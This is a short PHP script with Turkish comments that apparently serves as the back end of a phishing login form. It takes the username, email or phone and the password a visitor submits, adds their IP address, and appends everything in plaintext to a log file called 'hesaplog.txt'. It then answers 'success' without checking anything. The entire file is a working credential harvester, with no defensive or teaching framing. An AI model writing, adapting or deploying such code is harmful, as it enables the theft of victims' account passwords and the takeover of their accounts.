<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Formdan gelen verileri al
    $usernameEmailPhone = $_POST["username_email_phone"];
    $password = $_POST["password"];

    // Kullanıcının IP adresini al
    $ip = $_SERVER['REMOTE_ADDR'];

    // Dosya yolunu belirle
    $file = 'hesaplog.txt';

    // Verileri dosyaya ekle
    $current = "Kullanıcı Adı/Email/Telefon: " . $usernameEmailPhone . " - Şifre: " . $password . " - IP Adresi: " . $ip . "\n";
    file_put_contents($file, $current, FILE_APPEND | LOCK_EX);

    // Başarılı yanıtı gönder
    http_response_code(200);
    exit();
} else {
    // Geçersiz istek yanıtı gönder
    http_response_code(400);
    exit();
}
?>
